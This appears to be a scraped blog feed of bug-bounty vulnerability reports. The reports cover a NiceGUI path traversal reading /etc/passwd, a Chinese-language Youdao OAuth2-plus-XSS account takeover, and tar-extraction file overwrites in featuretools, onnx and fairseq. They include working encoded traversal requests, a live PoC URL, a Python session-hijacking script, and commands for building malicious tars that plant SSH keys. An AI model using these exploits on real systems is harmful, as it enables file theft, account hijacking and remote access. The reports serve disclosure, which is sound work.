<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: _xsrf=2|87674a0e|961e2a9f73992956aae527a8f55167fb|1706518977; _gitlab_session=64bf3e7143f852d8e3646970f8c7b3df; fakesession=hello
Pragma: no-cache
Referer: http://10.15.0.171:8080/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
Host: 10.15.0.171:8080
Accept-Encoding: gzip, deflate
Connection: close
</code></pre></div></div>

<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> in browser(change ip and port to your server).</p>

<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
...
</code></pre></div></div>

<p><img src="/assets/cve/niceui.png" alt="niceui" /></p>

<h2 id="impact">Impact</h2>

<p>Any file on the backend filesystem can be read by an attacker with access to the NiceUI leaflet website.</p>

<h2 id="reference">Reference</h2>

<p><a href="https://github.com/zauberzeug/nicegui/issues/2870">https://github.com/zauberzeug/nicegui/issues/2870</a></p>

<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">https://www.cve.org/CVERecord?id=CVE-2024-32005</a></p>

<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32005">https://nvd.nist.gov/vuln/detail/CVE-2024-32005</a></p>

<p><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj</a></p>

<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
</blockquote>

<h2 id="weakness">Weakness</h2>
<blockquote>
  <p>account takeover</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>High, 9.5</p>
</blockquote>

<h2 id="url">URL</h2>
<ul>
  <li>
    <p>POC网页: <a href="https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###">https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</a></p>
  </li>
  <li>
    <p>视频链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a> 提取码：1314</p>
  </li>
</ul>

<h2 id="key-payload">Key Payload</h2>

<p>OAuth2登录请求，其中code参数是攻击者截获的微博认证code：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
Host: ai.youdao.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://api.weibo.com/
Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<p>网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：</p>

<ol>
  <li>用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。</li>
  <li>当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。</li>
  <li>攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。</li>
</ol>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：<a href="https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225">https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</a></p>

    <p><img src="/assets/youdaoai/xiezuo.png" alt="xiezuo" /></p>

    <p><img src="/assets/youdaoai/xiezuoxss.png" alt="xiezuoxss" /></p>
  </li>
  <li>
    <p>受害者：注册网易有道智云平台账号，<a href="https://ai.youdao.com/login.s">https://ai.youdao.com/login.s</a>。并且进入账号设置，绑定微博账号。</p>

    <p>登录和注册：</p>

    <p><img src="/assets/youdaoai/register.png" alt="reg" /></p>

    <p>微博绑定：</p>

    <p><img src="/assets/youdaoai/weibo.png" alt="weibo" /></p>
  </li>
  <li>
    <p>攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。</p>

    <p>微博登录入口：</p>

    <p><img src="/assets/youdaoai/weibodenglu.png" alt="weibod" /></p>

    <p>微博扫码登录界面：</p>

    <p><img src="/assets/youdaoai/weiboauth.png" alt="weiboa" /></p>

    <p>分析微博验证界面的url链接：</p>

    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&amp;forcelogin=true###</p>

    <p>可以看到OAuth2的返回token是<code class="language-plaintext highlighter-rouge">code</code>类型，<code class="language-plaintext highlighter-rouge">redirect_uri</code>指向<code class="language-plaintext highlighter-rouge">https://ai.youdao.com/login-weibo-redirect.s</code>，未提供<code class="language-plaintext highlighter-rouge">state</code>参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。</p>
  </li>
  <li>
    <p>笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。</p>

    <p>youdao.com域名下的xss漏洞链接：</p>

    <p>https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</p>

    <p>将上述链接urlencode后替换redirect_uri值：</p>

    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</p>

    <p>打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：</p>

    <p><img src="/assets/youdaoai/redirect.png" alt="re" /></p>

    <p>跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：</p>

    <p><img src="/assets/youdaoai/weibotoken.png" alt="xss" /></p>

    <p><img src="/assets/youdaoai/webhook2.png" alt="webhook" /></p>
  </li>
  <li>
    <p>攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:</p>

    <p>第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 <code class="language-plaintext highlighter-rouge">JSESSIONID_NEW</code> cookie作为session cookie。</p>

    <p><img src="/assets/youdaoai/sessioncookie.png" alt="sess" /></p>

    <p>第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s</p>

    <p><img src="/assets/youdaoai/loginweibo.png" alt="login" /></p>

    <p>第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。</p>

    <p><img src="/assets/youdaoai/getjwt.png" alt="getjwt" /></p>

    <p>第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。</p>

    <p><img src="/assets/youdaoai/getuserinfo.png" alt="getuser" /></p>
  </li>
  <li>
    <p>为自动化上述过程，笔者提供自动化脚本供测试：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import requests
 import sys

 weiboCode= "weibo_code"
 # 1. login-weibo-redirect.s
 url = "https://ai.youdao.com/login-weibo-redirect.s?code="
 payload = {}
 headers = {
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
 'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
 }
 response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
 cookies = response.headers['Set-Cookie']

 JSESSIONID_NEW = None
 if cookies:
     cookie_strings = cookies.split(';')
     for cookie_string in cookie_strings:
         cookie_parts = cookie_string.strip().split('=')
         if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
             JSESSIONID_NEW = cookie_parts[1]
             print("Cookie Value:", JSESSIONID_NEW)
             break

 if not JSESSIONID_NEW:
     print("no JSESSIONID_NEW found")
     sys.exit()

 print("################get JSESSIONID_NEW###############")
 print(JSESSIONID_NEW)


 # 2. login-weibo.s 
 url = "https://ai.youdao.com/login-weibo.s"

 payload = {}
 headers = {
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
 'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
 'Origin': 'https://ai.youdao.com',
 'Sec-Fetch-Site': 'same-origin'
 }
 response = requests.request("POST", url, headers=headers, data=payload)

 # /consoleApi/ABTest/checkUser
 url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
 payload = {}
 response = requests.request("GET", url, headers=headers, data=payload)
 Authorization = response.headers['Authorization']
 print("################Authorization###############")
 print(Authorization)

 # /consoleApi/user/getUserInfo
 url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
 payload = {}
 response = requests.request("POST", url, headers=headers, data=payload)
 print("################getUserInfo###############")
 print(response.text)
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="proof">Proof</h3>
<p>请提供截图或视频</p>

<p>链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a>
提取码：1314</p>

<h2 id="impact">Impact</h2>

<p>该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。</p>

<h2 id="patch-advice">Patch advice</h2>

<ol>
  <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset">featuretools.read_entityset</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">featuretools.read_entityset</code> function, which can be imported easily. It’s an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.</p>

<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">read_entityset</code> function extracts a tar file downloaded from internet without performing any security checks.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def read_entityset(path, profile_name=None, **kwargs):
    """Read entityset from disk, S3 path, or URL.

    Args:
        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
            Set to False to use an anonymous profile.
        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
    """
    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
        with tempfile.TemporaryDirectory() as tmpdir:
            local_path = path
            transport_params = None

            if _is_s3(path):
                transport_params = get_transport_params(profile_name)

            if _is_s3(path) or _is_url(path):
                local_path = os.path.join(tmpdir, "temporary_es")
                use_smartopen_es(local_path, path, transport_params) # download file from url!
            ### tar file extracted to tepdir without any security checks ###
            with tarfile.open(str(local_path)) as tar:
                tar.extractall(path=tmpdir)

            data_description = read_data_description(tmpdir)
            return description_to_entityset(data_description, **kwargs)
    else:
        data_description = read_data_description(path)
        return description_to_entityset(data_description, **kwargs)
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>

<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar</a></p>

<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">read_entityset</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import featuretools as ft
ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing">https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in onnx</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in onnx" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Huntr: Arbitrary File Overwrite in onnx</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://onnx.ai/onnx/api/hub.html#download-model-with-test-data">download_model_with_test_data</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly leads to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function, which is further used in the onnx framework, as well as can be imported easily.</p>

<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function extracts a tar file downloaded from internet without performing any security checks.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def download_model_with_test_data(
    model: str,
    repo: str = "onnx/models:main", # change to attacker's repo
    opset: Optional[int] = None,
    force_reload: bool = False,
    silent: bool = False, # set silent to True
) -&gt; Optional[str]:
    selected_model = get_model_info(model, repo, opset)

    local_model_with_data_path_arr = selected_model.metadata[
        "model_with_data_path"
    ].split("/")

    model_with_data_sha = selected_model.metadata["model_with_data_sha"]
    ...
    local_model_with_data_path = join(
        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)
    )

    if force_reload or not os.path.exists(local_model_with_data_path):
        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)
        lfs_url = _get_base_url(repo, True)
        print(f"Downloading {model} to local path {local_model_with_data_path}")
        _download_file( # download model from github repository
            lfs_url + selected_model.metadata["model_with_data_path"],
            local_model_with_data_path,
        )
    else:
        print(f"Using cached {model} model from {local_model_with_data_path}")

    with open(local_model_with_data_path, "rb") as f:
        model_with_data_bytes = f.read()

    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:
        # FIXME: Avoid index manipulation with magic numbers
        local_model_with_data_dir_path = local_model_with_data_path[
            0 : len(local_model_with_data_path) - 7
        ]
        model_with_data_zipped.extractall(local_model_with_data_dir_path) # just extract without any security checks

    return model_with_data_path
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may also have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar.gz /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> as onnx model to his own github repository. Besides, create file <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> with tar file path(<code class="language-plaintext highlighter-rouge">model_with_data_path</code>) and sha256 value(<code class="language-plaintext highlighter-rouge">model_with_data_sha</code>).</p>

<p>Create malicious model repo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git lfs track "*.gz"
git add .
git commit -m 'add gz lfs models'
git push
</code></pre></div></div>

<p>the <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> metadata file example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
    {
        "model": "MNIST",
        "model_path": "validated/mnist-8.onnx",
        "onnx_version": "1.3",
        "opset_version": 8,
        "metadata": {
            "model_sha": "",
            "model_bytes": 26454,
            "tags": [
                "vision",
                "classification",
                "mnist"
            ],
            "io_ports": {
                "inputs": [
                    {
                        "name": "Input3",
                        "shape": [
                            1,
                            1,
                            28,
                            28
                        ],
                        "type": "tensor(float)"
                    }
                ],
                "outputs": [
                    {
                        "name": "Plus214_Output_0",
                        "shape": [
                            1,
                            10
                        ],
                        "type": "tensor(float)"
                    }
                ]
            },
            "model_with_data_path": "validated/hack.tar.gz",
            "model_with_data_sha": "786bb632aab30bb574f7f2bab991c56c7707f8d224845f85a16bce32e7980cac",
            "model_with_data_bytes": 26751
        }
    }
]
</code></pre></div></div>
<p>I have create one malicous repo for testing: <a href="https://github.com/sunriseXu/onnx">https://github.com/sunriseXu/onnx</a></p>

<p>If anyone now downloads model from online github repository, and <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> will extract the malicous tar file and overwrite files specified in tarfile by absolute path silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from onnx import ModelProto, hub
hub.download_model_with_test_data("mnist",repo="sunriseXu/onnx",force_reload=True,silent=True)
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>tested in google colab: <a href="https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing">https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing</a></p>

<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc.png" alt="poc1" /></p>

<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc2.png" alt="poc2" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<p>SSH Access
On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<p>Web Servers
On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite in from_pretrained api in facebook fairseq</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <a href="https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained">from_pretrained</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>

<p>The vulnerable function is exposed through the <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272">BaseFairseqModel.from_pretrained</a> function. It’s an api used to read pretrained from files on disk, S3 path, or URL which is tar file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
        cls,
        model_name_or_path,
        checkpoint_file="model.pt",
        data_name_or_path=".",
        **kwargs,
    ):
        from fairseq import hub_utils

        x = hub_utils.from_pretrained(
            model_name_or_path,
            checkpoint_file,
            data_name_or_path,
            archive_map=cls.hub_models(),
            **kwargs,
        )
        logger.info(x["args"])
        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
</code></pre></div></div>

